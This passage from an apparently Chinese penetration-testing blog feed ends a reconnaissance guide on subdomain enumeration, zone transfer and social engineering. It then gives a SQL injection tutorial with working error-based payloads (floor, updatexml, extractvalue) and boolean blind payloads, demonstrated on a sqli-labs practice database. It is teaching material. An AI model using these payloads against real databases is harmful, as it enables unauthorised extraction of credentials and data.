ns3.baidu.com</div><div class="line">baidu.com       nameserver = ns2.baidu.com</div><div class="line">baidu.com       nameserver = ns4.baidu.com</div><div class="line">baidu.com       nameserver = dns.baidu.com</div><div class="line">jpmx.baidu.com  internet address = 61.208.132.13</div><div class="line">dns.baidu.com   internet address = 202.108.22.220</div><div class="line">ns2.baidu.com   internet address = 61.135.165.235</div><div class="line">ns3.baidu.com   internet address = 220.181.37.10</div><div class="line">ns4.baidu.com   internet address = 220.181.38.10</div><div class="line">ns7.baidu.com   internet address = 180.76.76.92</div><div class="line">&gt; exit</div></pre></td></tr></table></figure></p>
<p>邮件在发送的过程:</p>
<p>1.发件人服务器需要先解析“收件人的域名”的MX主机<br>2.然后解析MX主机对应的IP<br>3.服务器通过连接对方的MX主机的25（邮件SMTP端口）发送邮件<br>4.用户通过客户端工具如OUTLOOK  foxmail软件连接收件人邮件服务器进行接收邮件<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-1/25287351.jpg" alt=""></p>
<h2 id="0x08-子域名查询"><a href="#0x08-子域名查询" class="headerlink" title="0x08 子域名查询"></a>0x08 子域名查询</h2><p>1、fierse工具：fierce -dns  www.baidu.com<br>2、在线查询：<a href="http://i.links.cn/subdomain/" target="_blank" rel="external">http://i.links.cn/subdomain/</a><br>3、谷歌语法：site: baidu.com/<br>4、subDomainsBrute：<a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="external">https://github.com/lijiejie/subDomainsBrute</a><br>5、DNS域传送漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; nslookup   输入nslookup命令进入交互式shell</div><div class="line">&gt; server DNS服务器   Server 命令参数设定查询将要使用的DNS服务器</div><div class="line">&gt; ls 域名   Ls命令列出某个域中的所有域名</div><div class="line">&gt; exit  Exit命令退出程序</div></pre></td></tr></table></figure></p>
<h2 id="0x09-源码泄露、敏感目录"><a href="#0x09-源码泄露、敏感目录" class="headerlink" title="0x09 源码泄露、敏感目录"></a>0x09 源码泄露、敏感目录</h2><ul>
<li><p>源码泄露<br>1、.git源码泄露<br>2、.DS_Store文件泄漏<br>3、SVN文件泄露<br>4、代码托管平台<br>5、网站备份压缩文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">.rar</div><div class="line">.zip</div><div class="line">.7z</div><div class="line">.tar.gz</div><div class="line">.bak</div><div class="line">.swp</div><div class="line">.txt</div><div class="line">.html</div></pre></td></tr></table></figure>
</li>
<li><p>敏感目录<br>1、nikto<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/36784113.jpg" alt=""><br>2、dirb<br><img src="http://obh1qcqek.bkt.clouddn.com/17-8-3/71646913.jpg" alt=""><br>3、御剑目录扫描</p>
</li>
</ul>
<h2 id="0x10-旁注-C段"><a href="#0x10-旁注-C段" class="headerlink" title="0x10 旁注 C段"></a>0x10 旁注 C段</h2><p>　　旁注的意思就是从同台服务器上的其他网站入手，提权，然后把服务器拿下，就自然那个网站也就拿下了。C段嗅探，每个IP有ABCD四个段，举个例子，192.168.0.1，A段就是192，B段是168，C段是0，D段是1，而C段嗅探的意思就是拿下它同一C段中的其中一台服务器，也就是说是D段1-255中的一台服务器，然后利用工具嗅探拿下该服务。<br>在线查询：<br><a href="http://www.webscan.cc/" target="_blank" rel="external">http://www.webscan.cc/</a><br><a href="http://dns.aizhan.com/" target="_blank" rel="external">http://dns.aizhan.com/</a><br><a href="http://www.secbox.cn/wp-content/uploads/2015/02/%E5%AE%89%E5%85%A8%E7%9B%92%E5%AD%90C%E6%AE%B5%E6%97%81%E6%B3%A8%E5%B7%A5%E5%85%B7%E7%AC%AC%E4%BA%8C%E7%89%88.rar" target="_blank" rel="external">安全盒子C段旁注工具</a></p>
<h2 id="0x11-社工"><a href="#0x11-社工" class="headerlink" title="0x11 社工"></a>0x11 社工</h2><p>QQ、QQ空间、微信朋友圈、微博、支付宝<br>Maltego：社工神器<br>社工库：<br><a href="http://s.70sec.com/" target="_blank" rel="external">http://s.70sec.com/</a><br>社交网站：<br><a href="http://twitter.com" target="_blank" rel="external">http://twitter.com</a><br><a href="http://facebook.com" target="_blank" rel="external">http://facebook.com</a><br>求职网站：<br><a href="http://linkedin.com" target="_blank" rel="external">http://linkedin.com</a><br><a href="http://plaxo.com" target="_blank" rel="external">http://plaxo.com</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;　　信息搜集是渗透目标的最重要的阶段，占据整个渗透测试的60%，可见信息搜集的重要性。根据收集的有用信息，可以大大提高我们渗透测试的成功率。&lt;/p&gt;
&lt;h2 id=&quot;0x01-搜索引擎&quot;&gt;&lt;a href=&quot;#0x01-搜索引擎&quot; class=&quot;headerlink&quot; title=&quot;0x01 搜索引擎&quot;&gt;&lt;/a&gt;0x01 搜索引擎&lt;/h2&gt;&lt;p&gt;Google、Bing、ZoomEye（钟馗之眼）、Shodan（撒旦）&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Google hacking
    
    </summary>
    
      <category term="渗透" scheme="http://yoursite.com/categories/%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入技巧</title>
    <link href="http://yoursite.com/%E6%BC%8F%E6%B4%9E/2017/07/01/SQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html"/>
    <id>http://yoursite.com/漏洞/2017/07/01/SQL注入技巧.html</id>
    <published>2017-07-01T13:27:25.000Z</published>
    <updated>2017-08-24T02:31:51.384Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x01-SQL注入"><a href="#0x01-SQL注入" class="headerlink" title="0x01 SQL注入"></a>0x01 SQL注入</h3><p>1、连接符:mysql 空格，Oracle ||,sql server +<br>2、黑魔法${IFS}，Linux下可以使用其代替空格</p>
<a id="more"></a>
<h3 id="0x02-相关函数"><a href="#0x02-相关函数" class="headerlink" title="0x02 相关函数"></a>0x02 相关函数</h3><p>参考数据库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>mid()   从文本字段中提取字符</p>
</blockquote>
<p>SELECT MID(column_name,start[,length]) FROM table_name;<br>column_name    必需。要提取字符的字段。<br>start    必需。规定开始位置（起始值是 1）。<br>length    可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select mid(username,1,2) from users;</div><div class="line">+-------------------+</div><div class="line">| mid(username,1,2) |</div><div class="line">+-------------------+</div><div class="line">| Du                |</div><div class="line">| An                |</div><div class="line">| Du                |</div><div class="line">| se                |</div><div class="line">| st                |</div><div class="line">| su                |</div><div class="line">| ba                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| ad                |</div><div class="line">| dh                |</div><div class="line">| ad                |</div><div class="line">+-------------------+</div><div class="line">mysql&gt; select mid(username,2) from users;</div><div class="line">+-----------------+</div><div class="line">| mid(username,2) |</div><div class="line">+-----------------+</div><div class="line">| umb             |</div><div class="line">| ngelina         |</div><div class="line">| ummy            |</div><div class="line">| ecure           |</div><div class="line">| tupid           |</div><div class="line">| uperman         |</div><div class="line">| atman           |</div><div class="line">| dmin            |</div><div class="line">| dmin1           |</div><div class="line">| dmin2           |</div><div class="line">| dmin3           |</div><div class="line">| hakkan          |</div><div class="line">| dmin4           |</div><div class="line">+-----------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>limit() 返回前几条或者中间某几行数据</p>
</blockquote>
<p>select * from table limit m,n    其m指记录始index0始表示第条记录 n指第m+1条始取n条<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users limit 1,2;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>concat与concat_ws与group_concat</p>
</blockquote>
<p>  MySQL的concat函数在连接字符串的时候，只要其中一个是NULL,那么将返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat(&apos;123&apos;,null);</div><div class="line">+--------------------+</div><div class="line">| concat(&apos;123&apos;,null) |</div><div class="line">+--------------------+</div><div class="line">| NULL               |</div><div class="line">+--------------------+</div><div class="line">mysql&gt; select concat(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+---------------------+</div><div class="line">| concat(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+---------------------+</div><div class="line">| 123456              |</div><div class="line">+---------------------+</div></pre></td></tr></table></figure></p>
<p>和concat不同的是, concat_ws函数在执行的时候,不会因为NULL值而返回NULL<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,null);</div><div class="line">+-----------------------+</div><div class="line">| concat_ws(&apos;123&apos;,null) |</div><div class="line">+-----------------------+</div><div class="line">|                       |</div><div class="line">+-----------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;123&apos;,&apos;456&apos;);</div><div class="line">+------------------------+</div><div class="line">| concat_ws(&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+------------------------+</div><div class="line">| 456                    |</div><div class="line">+------------------------+</div><div class="line">mysql&gt; select concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;);</div><div class="line">+----------------------------+</div><div class="line">| concat_ws(&apos;.&apos;,&apos;123&apos;,&apos;456&apos;) |</div><div class="line">+----------------------------+</div><div class="line">| 123.456                    |</div><div class="line">+----------------------------+</div></pre></td></tr></table></figure></p>
<p>group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排序字段] [Separator ‘分隔符’])<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from aa;  </div><div class="line">+------+------+</div><div class="line">| id| name |</div><div class="line">+------+------+</div><div class="line">|1 | 10|</div><div class="line">|1 | 20|</div><div class="line">|1 | 20|</div><div class="line">|2 | 20|</div><div class="line">|3 | 200 |</div><div class="line">|3 | 500 |</div><div class="line">+------+------+</div><div class="line">mysql&gt;select id,group_concat(name) from aa group by id;  </div><div class="line">+------+--------------------+</div><div class="line">| id| group_concat(name) |</div><div class="line">+------+--------------------+</div><div class="line">|1 | 10,20,20|</div><div class="line">|2 | 20 |</div><div class="line">|3 | 200,500|</div><div class="line">+------+--------------------+</div></pre></td></tr></table></figure></p>
<blockquote>
<p>Count() 聚集函数，统计元祖的个数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*) from users;</div><div class="line">+----------+</div><div class="line">| count(*) |</div><div class="line">+----------+</div><div class="line">|       13 |</div><div class="line">+----------+</div></pre></td></tr></table></figure>
<blockquote>
<p>rand() 用于产生一个0~1的随机数</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select rand(),rand();</div><div class="line">+---------------------+--------------------+</div><div class="line">| rand()              | rand()             |</div><div class="line">+---------------------+--------------------+</div><div class="line">| 0.37330908176797356 | 0.7865611089268337 |</div><div class="line">+---------------------+--------------------+</div><div class="line">mysql&gt; select * from users group by rand();</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">|  6 | superman | genious    |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>floor()   向下取整 </p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select floor(123.456),floor(-123.456);</div><div class="line">+----------------+-----------------+</div><div class="line">| floor(123.456) | floor(-123.456) |</div><div class="line">+----------------+-----------------+</div><div class="line">|            123 |            -124 |</div><div class="line">+----------------+-----------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>group by 依据我们想要的规则对结果进行分组</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select * from users group by username;</div><div class="line">+----+----------+------------+</div><div class="line">| id | username | password   |</div><div class="line">+----+----------+------------+</div><div class="line">|  8 | admin    | admin      |</div><div class="line">|  9 | admin1   | admin1     |</div><div class="line">| 10 | admin2   | admin2     |</div><div class="line">| 11 | admin3   | admin3     |</div><div class="line">| 14 | admin4   | admin4     |</div><div class="line">|  2 | Angelina | I-kill-you |</div><div class="line">|  7 | batman   | mob!le     |</div><div class="line">| 12 | dhakkan  | dumbo      |</div><div class="line">|  1 | Dumb     | Dumb       |</div><div class="line">|  3 | Dummy    | p@ssword   |</div><div class="line">|  4 | secure   | crappy     |</div><div class="line">|  5 | stupid   | stupidity  |</div><div class="line">|  6 | superman | genious    |</div><div class="line">+----+----------+------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>length()  返回字符串的长度</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select length(&apos;www.baidu.com&apos;);</div><div class="line">+-------------------------+</div><div class="line">| length(&apos;www.baidu.com&apos;) |</div><div class="line">+-------------------------+</div><div class="line">|                      13 |</div><div class="line">+-------------------------+</div><div class="line">mysql&gt; select * from users where length(username) &lt;6;</div><div class="line">+----+----------+----------+</div><div class="line">| id | username | password |</div><div class="line">+----+----------+----------+</div><div class="line">|  1 | Dumb     | Dumb     |</div><div class="line">|  3 | Dummy    | p@ssword |</div><div class="line">|  8 | admin    | admin    |</div><div class="line">+----+----------+----------+</div></pre></td></tr></table></figure>
<blockquote>
<p>Substr()  截取字符串  三个参数  （所要截取字符串，截取的位置，截取的长度）</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr(&apos;123456&apos;,2,3);</div><div class="line">+----------------------+</div><div class="line">| substr(&apos;123456&apos;,2,3) |</div><div class="line">+----------------------+</div><div class="line">| 234                  |</div><div class="line">+----------------------+</div><div class="line">mysql&gt; select substr(username,2,3) from users ;</div><div class="line">+----------------------+</div><div class="line">| substr(username,2,3) |</div><div class="line">+----------------------+</div><div class="line">| umb                  |</div><div class="line">| nge                  |</div><div class="line">| umm                  |</div><div class="line">| ecu                  |</div><div class="line">| tup                  |</div><div class="line">| upe                  |</div><div class="line">| atm                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| dmi                  |</div><div class="line">| hak                  |</div><div class="line">| dmi                  |</div><div class="line">+----------------------+</div></pre></td></tr></table></figure>
<blockquote>
<p>Ascii()   返回字符串的ascii码</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(2);</div><div class="line">+----------+</div><div class="line">| ascii(2) |</div><div class="line">+----------+</div><div class="line">|       50 |</div><div class="line">+----------+</div><div class="line">mysql&gt; select ascii(substr(username,2,1)) from users;</div><div class="line">+-----------------------------+</div><div class="line">| ascii(substr(username,2,1)) |</div><div class="line">+-----------------------------+</div><div class="line">|                         117 |</div><div class="line">|                         110 |</div><div class="line">|                         117 |</div><div class="line">|                         101 |</div><div class="line">|                         116 |</div><div class="line">|                         117 |</div><div class="line">|                          97 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         100 |</div><div class="line">|                         104 |</div><div class="line">|                         100 |</div><div class="line">+-----------------------------+</div></pre></td></tr></table></figure>
<h3 id="0x03-基于报错注入"><a href="#0x03-基于报错注入" class="headerlink" title="0x03 基于报错注入"></a>0x03 基于报错注入</h3><p>常用floor，UpdateXml(有长度限制,最长32位)，ExtractValue(有长度限制,最长32位)</p>
<blockquote>
<p>floor报错</p>
</blockquote>
<ul>
<li><p>获取数据库：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),(concat(0x3a,database(),0x3a,floor(rand()*2))) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       58 | :security:0 |</div><div class="line">|       47 | :security:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 3,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-----------+</div><div class="line">| count(*) | name      |</div><div class="line">+----------+-----------+</div><div class="line">|       44 | ::users:0 |</div><div class="line">|       61 | ::users:1 |</div><div class="line">+----------+-----------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取字段名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+-------------+</div><div class="line">| count(*) | name        |</div><div class="line">+----------+-------------+</div><div class="line">|       51 | ::user_id:0 |</div><div class="line">|       54 | ::user_id:1 |</div><div class="line">+----------+-------------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select count(*),concat(0x3a,0x3a,(select username from users limit 0,1),0x3a,floor(rand()*2)) name from information_schema.tables group by name;</div><div class="line">+----------+----------+</div><div class="line">| count(*) | name     |</div><div class="line">+----------+----------+</div><div class="line">|       46 | ::Dumb:0 |</div><div class="line">|       59 | ::Dumb:1 |</div><div class="line">+----------+----------+</div></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>UpdateXml报错</p>
</blockquote>
<ul>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(table_name) FROM information_schema.tables WHERE table_schema=database() limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~users&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>获取字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 4,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~password&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(column_name) FROM information_schema.columns WHERE table_name=&apos;users&apos; limit 3,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~user&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>获取内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 0,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~Dumb&apos;</div><div class="line">mysql&gt; select updatexml(0,concat(0x7e,(SELECT concat(password) FROM users limit 1,1)),0);</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;~I-kill-you&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<blockquote>
<p>extractvalue报错</p>
</blockquote>
<ul>
<li><p>获取表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select table_name from information_schema.tables where table_schema=database() limit 3,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\users&apos;</div></pre></td></tr></table></figure>
</li>
<li><p>获取字段</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 1,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\I-kill-you&apos;</div><div class="line">mysql&gt; select extractvalue(1, concat(0x5c,(select password from users limit 0,1)));</div><div class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;\Dumb&apos;</div></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="0x04-基于布尔盲注"><a href="#0x04-基于布尔盲注" class="headerlink" title="0x04 基于布尔盲注"></a>0x04 基于布尔盲注</h3><ul>
<li><p>查看表名</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select table_name from information_schema.tables where table_schema=database() limit 0,1;</div><div class="line">+------------+</div><div class="line">| table_name |</div><div class="line">+------------+</div><div class="line">| emails     |</div><div class="line">+------------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取表名第一个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">| e    |</div><div class="line">+------+</div></pre></td></tr></table></figure>
</li>
<li><p>获取表名第一个字符的ASCII</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)) m;</div><div class="line">+------+</div><div class="line">| m    |</div><div class="line">+------+</div><div class="line">|  101 |</div><div class="line">+------+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>获取字段名与字段内容原理一样。</p>
<p>以Sqli-labs Less8为例，无论输入什么就只有正确和错误，于是可以判断基于布尔的盲注。</p>
<ul>
<li>先判断当前数据库的长度<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/sqli-labs/Less-8/?id=1&apos; and length(database())&gt;8 --+</div></pre></td></tr></table></figure>
</li>
</ul>
<p>发现当值为8的时候，页面就没有显示。那么说明database()的长度是8</p>
<ul>
<li>获取数据库名</li>
</ul>
